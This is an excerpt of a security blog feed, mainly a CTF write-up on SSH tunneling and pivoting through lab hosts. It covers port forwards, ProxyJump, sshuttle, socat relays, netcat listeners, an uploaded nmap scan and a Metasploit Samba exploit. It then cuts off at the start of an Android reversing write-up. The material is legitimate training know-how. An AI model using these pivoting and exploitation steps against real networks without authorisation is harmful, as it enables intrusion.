      <pubDate>Sun, 01 Nov 2020 00:00:00 +0000</pubDate>
      
      <guid>https://blog.ikuamike.io/posts/2020/grayhat_red_team_village_ctf_tunneler_writeup/</guid>
      <description></description>
      <content>&lt;h2 id=&#34;summary&#34;&gt;Summary&lt;/h2&gt;
&lt;p&gt;During Grayhat Conference the Red Team Village hosted a beginner/intermediate CTF. Our CTF team fr334aks decided
to participate as we enjoyed the previous CTF created by them during DEFCON. I tackled the Tunneler challenges
that were exactly the same as the previous CTF. So with the less pressure it was a nice opportunity to make a writeup for
ssh tunneling techniques.&lt;/p&gt;
&lt;p&gt;I am writing this to serve as a personal reference for ssh tunneling as it has a very good practical aspect to use as an example. I will show different
ways these challenges could have been solved.&lt;/p&gt;
&lt;h2 id=&#34;1-bastion&#34;&gt;1. Bastion&lt;/h2&gt;
&lt;p&gt;Challenge description:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Connect to the bastion host 104.131.101.182

User: tunneler 
Password: tunneler 
SSH Port: 2222
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Solution:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;ssh tunneler@104.131.101.182 -p &lt;span style=&#34;color:#ae81ff&#34;&gt;2222&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Once we ssh in, we get the following welcome message and also the bastion host is connected to multiple networks. We don&amp;rsquo;t see the ip we used to ssh in as
we are droppped in a docker container.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/grayhat_2020/screenshot1.png&#34;  alt=&#34;grayhat_redteam_ctf&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h2 id=&#34;2-browsing-websites&#34;&gt;2. Browsing Websites&lt;/h2&gt;
&lt;p&gt;Challenge Description:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Browse to http://10.174.12.14/
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This challenge requires a local port forward.&lt;/p&gt;
&lt;p&gt;Solution 1:&lt;/p&gt;
&lt;p&gt;Using ssh command.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;ssh tunneler@104.131.101.182 -p &lt;span style=&#34;color:#ae81ff&#34;&gt;2222&lt;/span&gt; -L 8000:10.174.12.14:80
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Then use curl to reach the website.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;curl 127.0.0.1:8000
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Solution 2:&lt;/p&gt;
&lt;p&gt;Using ssh config and add &lt;code&gt;LocalForward&lt;/code&gt; entry.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Host bastion
 Hostname 104.131.101.182
 User tunneler
 Port 2222
 LocalForward 8000 10.174.12.14:80
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Then ssh into bastion and run curl as above.&lt;/p&gt;
&lt;p&gt;Solution 3:&lt;/p&gt;
&lt;p&gt;Running sshuttle to add a route to the target ip, this utilizes the ssh config for bastion without the localforward entry.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;sshuttle -r bastion 10.174.12.14/32
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The beauty about this one is that I can reach the ip directly now.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;curl 10.174.12.14
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/grayhat_2020/screenshot2.png&#34;  alt=&#34;grayhat_redteam_ctf&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h2 id=&#34;3-ssh-in-tunnels&#34;&gt;3. SSH in tunnels&lt;/h2&gt;
&lt;p&gt;Challenge Description:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;SSH through the bastion to the pivot.

IP: 10.218.176.199 
User: whistler 
Pass: cocktailparty
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;For this challenge we need to jump through the bastion host and access the pivot.&lt;/p&gt;
&lt;p&gt;Solution 1:&lt;/p&gt;
&lt;p&gt;Using the &lt;code&gt;-J&lt;/code&gt; option in ssh command, this sets up a proxyjump.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;ssh -J tunneler@104.131.101.182:2222 whistler@10.218.176.199
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Solution 2:&lt;/p&gt;
&lt;p&gt;Using ssh config, this builds on the config we started with in the previous challenge and uses &lt;code&gt;ProxyJump&lt;/code&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Host pivot1
 Hostname 10.218.176.199
 User whistler
 ProxyJump bastion
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Then all we need to do is run the following command and see that pivot1 is also connected to more than one network.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;ssh pivot1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/grayhat_2020/screenshot3.png&#34;  alt=&#34;grayhat_redteam_ctf&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h2 id=&#34;4-beacons-everywhere&#34;&gt;4. Beacons Everywhere&lt;/h2&gt;
&lt;p&gt;Challenge Description:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Something is Beaconing to the pivot on port 58671-58680 
to ip 10.112.3.199, can you tunnel it back?

NOTE: IT IS THE SAME ON EACH PORT ONLY USE ONE PORT 
AND REMOVE YOUR TUNNEL WHEN YOU ARE DONE
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;For this challenge we need to achieve a remote port forward.&lt;/p&gt;
&lt;p&gt;Solution 1:&lt;/p&gt;
&lt;p&gt;Using ssh command. First we proxyjump then perform the remote port forward.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;ssh -J tunneler@104.131.101.182:2222 whistler@10.218.176.199 -R 10.112.3.199:58671:127.0.0.1:5000
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Then on another terminal window, open a netcat listener.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;nc -lvnp &lt;span style=&#34;color:#ae81ff&#34;&gt;5000&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Solution 2:&lt;/p&gt;
&lt;p&gt;Using ssh config. For this I&amp;rsquo;ll add a &lt;code&gt;RemoteForward&lt;/code&gt; option under pivot1.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Host pivot1
 Hostname 10.218.176.199
 User whistler
 ProxyJump bastion
 RemoteForward 58671 127.0.0.1:5000
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Then we just run &lt;code&gt;ssh pivot1&lt;/code&gt; and open a netcat listener.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/grayhat_2020/screenshot4.png&#34;  alt=&#34;grayhat_redteam_ctf&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h2 id=&#34;5-beacons-annoying&#34;&gt;5. Beacons Annoying&lt;/h2&gt;
&lt;p&gt;Challenge Description:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Connect to ip: 10.112.3.88 port: 7000, a beacon awaits you
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This challenge needs a local port forward and a remote port forward.&lt;/p&gt;
&lt;p&gt;Solution:&lt;/p&gt;
&lt;p&gt;Using ssh command, here we proxyjump and then forward localport 7000 to our target at port 7000.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;ssh -J tunneler@104.131.101.182:2222 whistler@10.218.176.199 -L 7000:10.112.3.88:7000
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Then connect using netcat.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;nc -vn 127.0.0.1 &lt;span style=&#34;color:#ae81ff&#34;&gt;7000&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/grayhat_2020/screenshot5.png&#34;  alt=&#34;grayhat_redteam_ctf&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Next step is using a reverse port forward to receive the flag, we need to be quick to set the port as the flag is sent after 15s.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;ssh -J tunneler@104.131.101.182:2222 whistler@10.218.176.199 -R 10.112.3.199:17172:127.0.0.1:6000
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Then on another terminal open a listener on port 6000.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;nc -vn 127.0.0.1 &lt;span style=&#34;color:#ae81ff&#34;&gt;6000&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/grayhat_2020/screenshot6.png&#34;  alt=&#34;grayhat_redteam_ctf&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;It was an annoying beacon indeed, we needed 4 terminal panes open (I use tmux).&lt;/p&gt;
&lt;h2 id=&#34;6-scan-me&#34;&gt;6. Scan me&lt;/h2&gt;
&lt;p&gt;Challenge Description:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;We deployed a ftp server but we forgot which port, find it and connect

ftp: 10.112.3.207 user: bishop pass: geese
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;For this challenge we need to perform a portscan then a local portforward. However, port scanning over a tunnel can be quite slow
or sometimes fail. I ended up uploading an nmap binary to pivot1 and then scan the target.&lt;/p&gt;
&lt;p&gt;Solution:&lt;/p&gt;
&lt;p&gt;Building on the previous ssh config, I&amp;rsquo;ll use scp to upload nmap. Nmap needs a services file to run, we need to upload that as well. Then from pivot1
we can perform a full portscan.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;scp /opt/nmap-7.91SVN-x86_64-portable/nmap pivot1:/tmp
scp /opt/nmap-7.91SVN-x86_64-portable/data/nmap-services pivot1:/tmp
./nmap --datadir /tmp -p- 10.112.3.207
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/grayhat_2020/screenshot7.png&#34;  alt=&#34;grayhat_redteam_ctf&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;After getting the port, let&amp;rsquo;s use sshuttle to add a route to the ftp server.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;sshuttle -r pivot1 10.112.3.207/32
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Next is to just connect to the ftp server, the flag was in the banner.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/grayhat_2020/screenshot8.png&#34;  alt=&#34;grayhat_redteam_ctf&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h2 id=&#34;7-another-pivot&#34;&gt;7. Another Pivot&lt;/h2&gt;
&lt;p&gt;Challenge Description:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Connect to the second pivot

IP: 10.112.3.12 
User: crease 
Pass: NoThatsaV
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;More proxyjumps.&lt;/p&gt;
&lt;p&gt;Solution 1:&lt;/p&gt;
&lt;p&gt;Multiple proxyjumps can be separated by a comma.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;ssh -J tunneler@104.131.101.182:2222,whistler@10.218.176.199 crease@10.112.3.12
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Solution 2:&lt;/p&gt;
&lt;p&gt;I&amp;rsquo;ll update ssh config with this new pivot.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Host pivot2
 Hostname 10.112.3.12
 User crease
 ProxyJump pivot1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Then run&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;ssh pivot2
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This host is connected to multiple networks and it seems portforwarding is disabled here, therefore we&amp;rsquo;ll have some fun with socat!&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/grayhat_2020/screenshot9.png&#34;  alt=&#34;grayhat_redteam_ctf&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h2 id=&#34;8-snmp&#34;&gt;8. SNMP&lt;/h2&gt;
&lt;p&gt;Challenge Description:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;There is a snmp server at 10.24.13.161
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This challenge is interesting because snmp runs over udp, you can&amp;rsquo;t really create a udp tunnel. We&amp;rsquo;ll tunnel udp inside a tcp tunnel.
Since in pivot2 tunneling is disabled we&amp;rsquo;ll use socat.&lt;/p&gt;
&lt;p&gt;Solution:&lt;/p&gt;
&lt;p&gt;First we ssh into pivot2 then open a tcp listener which redirects traffic to udp out to snmp.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;socat TCP4-LISTEN:5000,fork UDP4:10.24.13.161:161
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Next we open a local portforward through pivot1 to the tcp port on pivot2 we opened above, I&amp;rsquo;ll use the full ssh command here.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;ssh -J tunneler@104.131.101.182:2222 whistler@10.218.176.199 -L 5000:10.112.3.12:5000
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Then on our local machine we use socat again to redirect from local udp 161 to local port 5000 that would be forwarded by the above tunnel.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;sudo socat UDP4-LISTEN:161,fork TCP:localhost:5000
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Then finally we run snmpwalk against localhost and the traffic is forwarded through the long tunnel created.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;snmpwalk -v1 -c public localhost
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/grayhat_2020/screenshot10.png&#34;  alt=&#34;grayhat_redteam_ctf&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h2 id=&#34;9-samba&#34;&gt;9. Samba&lt;/h2&gt;
&lt;p&gt;Challenge Description:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;There is a samba server at 10.24.13.10, find a flag sitting in the root file system /

nothing to find in the shares
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Similar to the snmp one above we&amp;rsquo;ll use socat to tunnel to the samba server.&lt;/p&gt;
&lt;p&gt;Solution:&lt;/p&gt;
&lt;p&gt;First we ssh into pivot2 and use socat to redirect traffic&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;socat -v TCP-LISTEN:5000,fork TCP:10.24.13.10:445
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Then perform a local portforward through pivot1 to pivot2&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;ssh -J tunneler@104.131.101.182:2222 whistler@10.218.176.199 -L 5000:10.112.3.12:5000
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Based on the challenge description, we need to access the root file system and nothing is in the shares. Sounds like
we need to exploit it as there&amp;rsquo;s no other way to access the root file system.&lt;/p&gt;
&lt;p&gt;Solution:&lt;/p&gt;
&lt;p&gt;Run nmap to find the samba version and check for exploit in exploitdb using searchsploit.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;nmap -sC -sV -p &lt;span style=&#34;color:#ae81ff&#34;&gt;5000&lt;/span&gt; 127.0.0.1
searchsploit samba
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/grayhat_2020/screenshot11.png&#34;  alt=&#34;grayhat_redteam_ctf&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;There are several metasploit exploits listed for samba therefore we&amp;rsquo;ll use it.
The exploit that worked is &lt;code&gt;exploit/linux/samba/is_known_pipename&lt;/code&gt; and we get the flag.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/grayhat_2020/screenshot12.png&#34;  alt=&#34;grayhat_redteam_ctf&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h2 id=&#34;10-browsing-website-2&#34;&gt;10. Browsing website 2&lt;/h2&gt;
&lt;p&gt;Challenge Description:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Browse to http://2a02:6b8:b010:9010:1::86/
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This challenge shows portforwarding from ipv4 to ipv6. We&amp;rsquo;ll use socat too on this one.&lt;/p&gt;
&lt;p&gt;Solution:&lt;/p&gt;
&lt;p&gt;First we ssh into pivot1 then use socat to redirect traffic from ipv4 to ipv6.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;socat -v TCP-LISTEN:5000,fork TCP6:&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;2a02:6b8:b010:9010:1::86&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;:80
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Then forward local port 5000 through pivot1 to pivot 2&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;ssh pivot1 -L 5000:10.112.3.12:5000
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Then make the web request to local port 5000 which will be forwarded through the tunnel created.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;curl localhost:5000
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/grayhat_2020/screenshot13.png&#34;  alt=&#34;grayhat_redteam_ctf&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;The final base ssh config looked like this without the port forwards:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Host bastion
 Hostname 104.131.101.182
 User tunneler
 Port 2222

Host pivot1
 Hostname 10.218.176.199
 User whistler
 ProxyJump bastion

Host pivot2
 Hostname 10.112.3.12
 User crease
 ProxyJump pivot1
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;There are several techniques to make your tunneling much easier, for quick use like in a ctf I think crafting the full ssh command is better and
faster. For frequent connection, using sshuttle combined with a good ssh config can make your life much easier.&lt;/p&gt;
&lt;p&gt;After all those connections here&amp;rsquo;s a Network Diagram that visualizes the access we were able to achieve with the tunnels:&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/grayhat_2020/Tunneler.png&#34;  alt=&#34;grayhat_redteam_ctf&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Here&amp;rsquo;s a nice writeup by &lt;a href=&#34;https://twitter.com/Rayhan0x01&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;@Rayhan0x01&lt;/a&gt;

 on how he used a different approach using metasploit:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;https://rayhan0x01.github.io/ctf/2020/08/08/defcon-redteamvillage-ctf-tunneler-1,2,3,4,5,7,9.html
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;resources&#34;&gt;Resources&lt;/h2&gt;
&lt;p&gt;Some resources I think are helpful in understanding ssh tunneling properly.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;1. https://www.redhat.com/sysadmin/ssh-proxy-bastion-proxyjump
2. https://www.cyberciti.biz/faq/linux-unix-ssh-proxycommand-passing-through-one-host-gateway-server/
3. https://book.hacktricks.xyz/tunneling-and-port-forwarding
4. https://linuxize.com/post/how-to-setup-ssh-tunneling/
5. https://www.tecmint.com/create-ssh-tunneling-port-forwarding-in-linux/
6. https://app.cyberranges.com/scenario/5d5c06ed960f032f2eadd733
7. https://app.cyberranges.com/scenario/5d5eaf28960f032f2eae6add
8. https://app.cyberranges.com/scenario/5d640b0c960f032f2eb033a8
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;You can reach/follow me on Twitter if you have some feedback or questions.&lt;/p&gt;
&lt;p&gt;Twitter: &lt;a href=&#34;https://twitter.com/ikuamike&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;ikuamike&lt;/a&gt;

&lt;/p&gt;
&lt;p&gt;Github: &lt;a href=&#34;https://github.com/ikuamike&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;ikuamike&lt;/a&gt;

&lt;/p&gt;</content>
    </item>
    
    <item>
      <title>RaziCTF 2020 WriteUp: Chasing a lock</title>
      <link>https://blog.ikuamike.io/posts/2020/razictf-chasingalock-writeup/</link>
      <pubDate>Wed, 28 Oct 2020 00:00:00 +0000</pubDate>
      
      <guid>https://blog.ikuamike.io/posts/2020/razictf-chasingalock-writeup/</guid>
      <description></description>
      <content>&lt;h1 id=&#34;summary&#34;&gt;Summary&lt;/h1&gt;
&lt;p&gt;I recently participated in &lt;a href=&#34;https://ctftime.org/event/1167&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;RaziCTF 2020&lt;/a&gt;

 with team
&lt;a href=&#34;https://ctftime.org/team/112710&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;fr344aks&lt;/a&gt;

 and I was able to solve an android challenge that I thought
needs a proper writeup.
I was able to reverse engineer the provided app and use frida for dynamic analysis for a quick win.&lt;/p&gt;
&lt;h3 id=&#34;challenge-description&#34;&gt;Challenge Description:&lt;/h3&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/razictf_2020/screenshot1.png&#34;  alt=&#34;razictf&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;I first installed the app in my genymotion emulator to see the basic functionality. There is a padlock icon
constantly changing position on the screen and text at the bottom that says &lt;code&gt;20000 to break the lock&lt;/code&gt;.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/razictf_2020/screenshot2.png&#34;  alt=&#34;razictf&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;When I click on the padlock the number decreases by 1. This is definitely chasing a lock as the challenge name.&lt;/p&gt;
&lt;p&gt;The goal seems pretty straightforward, we need to get the value to zero to get the flag. Now to decompile the app and see if we
can find a way. Like my previous writeup, I&amp;rsquo;ll use jadx-gui.&lt;/p&gt;
&lt;p&gt;From the AndroidManifest.xml we get the MainActivity that is loaded when the app starts.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/razictf_2020/screenshot3.png&#34;  alt=&#34;razictf&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Looking at the MainActivity code we see a switcher object being initialized just before the if statement that does some
check before displaying the flag. The switcher object has a method &lt;code&gt;run&lt;/code&gt; that takes in a value &lt;code&gt;i&lt;/code&gt; and the output is checked
if it&amp;rsquo;s not null and then the flag is displayed.&lt;/p&gt;

